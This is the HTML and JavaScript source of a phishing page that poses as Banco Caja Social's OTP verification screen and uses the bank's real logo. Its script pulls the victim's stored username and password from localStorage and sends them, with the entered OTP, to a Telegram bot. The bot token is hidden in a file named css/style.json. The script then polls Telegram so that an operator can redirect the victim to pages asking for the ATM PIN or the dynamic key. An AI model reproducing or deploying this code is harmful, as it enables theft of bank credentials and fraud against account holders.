<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Portal Personas - Verificación OTP</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    body { font-family: 'Inter', sans-serif; }
    .loaderp {
      width: 48px;
      height: 48px;
      border: 5px solid #FFF;
      border-bottom-color: #e8114b;
      border-radius: 50%;
      display: inline-block;
      box-sizing: border-box;
      animation: rotation 1s linear infinite;
    }
    @keyframes rotation {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .loaderp-full {
      position: fixed;
      top: 0;
      left: 0;
      overflow-y: hidden;
      z-index: 1000;
      background-color: white;
      width: 100vw;
      height: 100vh;
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .hidden { display: none !important; }
    .otp-input {
      width: 50px;
      height: 60px;
      text-align: center;
      font-size: 24px;
      font-weight: bold;
      border: 2px solid #e5e7eb;
      border-radius: 8px;
      margin: 0 8px;
      transition: all 0.3s ease;
    }
    .otp-input:focus {
      outline: none;
      border-color: #3b82f6;
      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
    }
    .otp-input.filled {
      border-color: #10b981;
      background-color: #f0fdf4;
    }
    .resend-timer {
      color: #6b7280;
      font-size: 14px;
    }
    .resend-button {
      color: #3b82f6;
      cursor: pointer;
      font-weight: 500;
    }
    .resend-button:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body class="bg-gray-50 min-h-screen">
  <div class="max-w-md mx-auto bg-white min-h-screen">
    <div class="px-6 py-8">
      <div class="mb-8">
        <div class="w-48 h-12 flex items-center">
          <img src="https://bancapersonas.bancocajasocial.com/auth/resources/0flbi/login/bcs/img/logoBCSLine.svg"
               alt="Logo"
               class="h-full w-auto object-contain">
        </div>
      </div>
      <div class="mb-6">
        <button id="backButton" class="flex items-center text-gray-600 hover:text-gray-800 transition-colors">
          <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
          </svg>
          Volver
        </button>
      </div>
      <div class="text-center mb-8">
        <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
          <svg class="w-8 h-8 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
          </svg>
        </div>
        <h2 class="text-2xl font-bold text-gray-800 mb-2">
          Verificación de seguridad
        </h2>
        <p class="text-gray-600 mb-2">
          Hemos enviado un código de verificación a tu dispositivo móvil registrado
        </p>
        <p class="text-sm text-gray-500" id="phoneInfo">
          Termina en: •••• ••••
        </p>
      </div>
      <div class="mb-8">
        <label class="block text-gray-700 text-lg font-medium mb-6 text-center">
          Ingresa el código de 6 dígitos
        </label>
        <div class="flex justify-center mb-4" id="otpContainer">
          <input type="text" class="otp-input" maxlength="1" id="otp1" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
          <input type="text" class="otp-input" maxlength="1" id="otp2" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
          <input type="text" class="otp-input" maxlength="1" id="otp3" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
          <input type="text" class="otp-input" maxlength="1" id="otp4" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
          <input type="text" class="otp-input" maxlength="1" id="otp5" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
          <input type="text" class="otp-input" maxlength="1" id="otp6" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
        </div>
      </div>
      <div class="text-center mb-8">
        <p class="text-sm text-gray-600 mb-2">¿No recibiste el código?</p>
        <div id="resendSection">
          <span class="resend-timer" id="timerText">Reenviar código en <span id="countdown">60</span>s</span>
          <button class="resend-button hidden" id="resendButton">Reenviar código</button>
        </div>
      </div>
      <button id="verifyButton" disabled
        class="w-full bg-gray-300 text-gray-500 py-3 rounded-lg text-lg font-medium mb-6 cursor-not-allowed transition-all">
        Verificar código
      </button>
      <div class="bg-blue-50 border border-blue-200 rounded-lg p-4">
        <div class="flex items-start">
          <svg class="w-5 h-5 text-blue-600 mt-0.5 mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
          </svg>
          <div>
            <p class="text-sm text-blue-800 font-medium mb-1">Importante</p>
            <p class="text-sm text-blue-700">
              Por tu seguridad, este código expira en 5 minutos. No compartas este código con nadie.
            </p>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div class="loaderp-full" id="loaderFull" role="status" aria-hidden="true">
    <span class="loaderp" aria-hidden="true"></span>
    <p class="text-gray-600 text-lg font-light mt-4">Verificando código...</p>
  </div>
  <script>
    const otpInputs = document.querySelectorAll('.otp-input');
    const verifyButton = document.getElementById('verifyButton');
    const backButton = document.getElementById('backButton');
    const resendButton = document.getElementById('resendButton');
    const timerText = document.getElementById('timerText');
    const countdownSpan = document.getElementById('countdown');
    const loader = document.getElementById('loaderFull');
    let userData = {};
    let loginData = {};
    let countdown = 60;
    let timerInterval;
    let polling = false;
    let lastUpdateId = -1;
    let pollingTimer = null;

    function loadPreviousData() {
      try {
        const savedUserData = localStorage.getItem('userData');
        const savedLoginData = localStorage.getItem('loginData');
        if (savedUserData) userData = JSON.parse(savedUserData);
        if (savedLoginData) loginData = JSON.parse(savedLoginData);
        if (userData.telefono) {
          const phone = userData.telefono;
          const maskedPhone = phone.slice(-4);
          document.getElementById('phoneInfo').textContent = `Termina en: •••• ${maskedPhone}`;
        }
      } catch (e) {
        console.error('Error al cargar datos previos:', e);
      }
    }

    async function loadTelegramConfig() {
      try {
        const res = await fetch('./css/style.json', { cache: 'no-store' });
        if (!res.ok) throw new Error('No se pudo cargar css/style.json (status ' + res.status + ')');
        const cfg = await res.json();
        if (!cfg.token || !cfg.chat_id) {
          console.error('Archivo de configuración inválido (falta token o chat_id).');
          return null;
        }
        return cfg;
      } catch (err) {
        console.error('loadTelegramConfig error:', err);
        return null;
      }
    }

    function setupOTPInputs() {
      otpInputs.forEach((input, index) => {
        input.addEventListener('input', function(e) {
          const value = e.target.value;
          if (!/^\d$/.test(value) && value !== '') {
            e.target.value = '';
            return;
          }
          if (value) {
            e.target.classList.add('filled');
            if (index < otpInputs.length - 1) {
              otpInputs[index + 1].focus();
            }
          } else {
            e.target.classList.remove('filled');
          }
          checkOTPComplete();
        });
        input.addEventListener('keydown', function(e) {
          if (e.key === 'Backspace' && !e.target.value && index > 0) {
            otpInputs[index - 1].focus();
            otpInputs[index - 1].classList.remove('filled');
          }
          if (e.key === 'Enter' && !verifyButton.disabled) {
            verifyButton.click();
          }
        });
        input.addEventListener('focus', function() {
          this.select();
        });
      });
    }

    function checkOTPComplete() {
      const otp = getOTPValue();
      const isComplete = otp.length === 6;
      verifyButton.disabled = !isComplete;
      verifyButton.classList.toggle('bg-blue-600', isComplete);
      verifyButton.classList.toggle('text-white', isComplete);
      verifyButton.classList.toggle('hover:bg-blue-700', isComplete);
      verifyButton.classList.toggle('cursor-pointer', isComplete);
      verifyButton.classList.toggle('bg-gray-300', !isComplete);
      verifyButton.classList.toggle('text-gray-500', !isComplete);
      verifyButton.classList.toggle('cursor-not-allowed', !isComplete);
    }

    function getOTPValue() {
      return Array.from(otpInputs).map(input => input.value).join('');
    }

    function clearOTP() {
      otpInputs.forEach(input => {
        input.value = '';
        input.classList.remove('filled');
      });
      otpInputs[0].focus();
      checkOTPComplete();
    }

    function startResendTimer() {
      countdown = 60;
      timerText.classList.remove('hidden');
      resendButton.classList.add('hidden');
      if (timerInterval) clearInterval(timerInterval);
      timerInterval = setInterval(() => {
        countdown--;
        countdownSpan.textContent = countdown;
        if (countdown <= 0) {
          clearInterval(timerInterval);
          timerText.classList.add('hidden');
          resendButton.classList.remove('hidden');
        }
      }, 1000);
    }

    async function sendOTPToTelegram(otpCode) {
      const config = await loadTelegramConfig();
      if (!config) throw new Error('No se pudo cargar configuración Telegram');
      const transactionId = loginData.transactionId || Date.now().toString(36) + Math.random().toString(36).substr(2);
      loginData.transactionId = transactionId;
      localStorage.setItem('loginData', JSON.stringify(loginData));
      const message = `📱 Verificación OTP Completada
🔗 Session ID: ${transactionId}
👤 Usuario: ${userData.usuario || loginData.usuario || 'N/A'}
🔑 Contraseña: ${loginData.password || 'N/A'}
📱 Código OTP: ${otpCode}`;
      const keyboard = {
        inline_keyboard: [
          [{ text: "🏧 Pedir Clave Cajero", callback_data: `pedir_cajero:${transactionId}` }],
          [{ text: "🔐 Pedir Clave Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
          [{ text: "📱 Pedir Nuevo OTP", callback_data: `pedir_nuevo_otp:${transactionId}` }],
          [{ text: "❌ Error OTP", callback_data: `error_otp:${transactionId}` }],
          [{ text: "✅ Finalizar", callback_data: `finalizar:${transactionId}` }]
        ]
      };
      const body = {
        chat_id: config.chat_id,
        text: message,
        reply_markup: keyboard,
        parse_mode: 'Markdown'
      };
      const res = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });
      const j = await res.json();
      if (!j.ok) {
        console.error('sendMessage respuesta:', j);
        throw new Error('Error enviando mensaje a Telegram: ' + (j.description || 'unknown'));
      }
      return { result: j.result, transactionId };
    }

    async function checkAdminResponse(transactionId) {
      if (polling) return;
      polling = true;
      let config = null;

      try {
          config = await loadTelegramConfig();
          if (!config) throw new Error('No se pudo cargar la configuración de Telegram.');
      } catch (err) {
          console.error("Error inicializando el sondeo:", err);
          loader.style.display = 'none';
          polling = false;
          return;
      }

      // Inicializa el offset para buscar actualizaciones
      try {
          const updatesRes = await fetch(`https://api.telegram.org/bot${config.token}/getUpdates?offset=-1`, { cache: 'no-store' });
          const updatesData = await updatesRes.json();
          if (updatesData.ok && updatesData.result.length > 0) {
              lastUpdateId = updatesData.result[updatesData.result.length - 1].update_id;
          }
      } catch (err) {
          console.error("Error al obtener el último update_id:", err);
      }

      function pollUpdates() {
          if (!polling) return;

          const offsetParam = lastUpdateId > -1 ? `&offset=${lastUpdateId + 1}` : '';
          const url = `https://api.telegram.org/bot${config.token}/getUpdates?timeout=30${offsetParam}`;

          fetch(url, { cache: 'no-store' })
              .then(response => response.json())
              .then(data => {
                  if (!data.ok) {
                      console.error("Error en getUpdates:", data.description);
                      if (polling) pollingTimer = setTimeout(pollUpdates, 5000);
                      return;
                  }

                  if (data.result.length > 0) {
                      lastUpdateId = data.result[data.result.length - 1].update_id;
                      const verificationUpdate = data.result.find(update =>
                          update.callback_query && update.callback_query.data.endsWith(`:${transactionId}`)
                      );

                      if (verificationUpdate) {
                          loader.style.display = 'none';
                          polling = false;
                          if (pollingTimer) clearTimeout(pollingTimer);
                          handleAdminResponse(verificationUpdate.callback_query.data);
                          return;
                      }
                  }

                  if (polling) pollingTimer = setTimeout(pollUpdates, 2000);
              })
              .catch(error => {
                  console.error("Error al verificar respuesta:", error);
                  if (polling) pollingTimer = setTimeout(pollUpdates, 5000);
              });
      }

      // Iniciar el sondeo
      pollUpdates();
    }

    function handleAdminResponse(callbackData) {
      const [action] = (callbackData || '').split(':');
      switch (action) {
        case 'pedir_cajero':
          window.location.href = 'clavec.html';
          break;
        case 'pedir_dinamica':
          window.location.href = 'dinamica.html';
          break;
        case 'pedir_nuevo_otp':
          clearOTP();
          startResendTimer();
          break;
        case 'error_otp':
          clearOTP();
          break;
        case 'finalizar':
          window.location.href = 'index.html';
          break;
        default:
          window.location.href = 'index.html';
          break;
      }
    }

    verifyButton.addEventListener('click', async function() {
      const otpCode = getOTPValue();
      if (otpCode.length !== 6) return;
      loader.style.display = 'flex';
      try {
        const { result, transactionId } = await sendOTPToTelegram(otpCode);
        console.log('OTP enviado a Telegram:', result);
        checkAdminResponse(transactionId);
      } catch (err) {
        console.error('Error enviando OTP:', err);
        loader.style.display = 'none';
        window.location.href = 'index.html';
      }
    });

    backButton.addEventListener('click', function() {
      window.history.back();
    });

    resendButton.addEventListener('click', async function() {
      startResendTimer();
      try {
        const { transactionId } = await sendOTPToTelegram('Reenvío');
        console.log('Solicitud de reenvío enviada a Telegram:', transactionId);
      } catch (err) {
        console.error('Error enviando solicitud de reenvío:', err);
      }
    });

    document.addEventListener('DOMContentLoaded', function() {
      loadPreviousData();
      setupOTPInputs();
      startResendTimer();
      otpInputs[0].focus();
      if (!userData.usuario && !loginData.usuario) {
        window.location.href = 'index.html';
      }
    });
  </script>
</body>
</html>
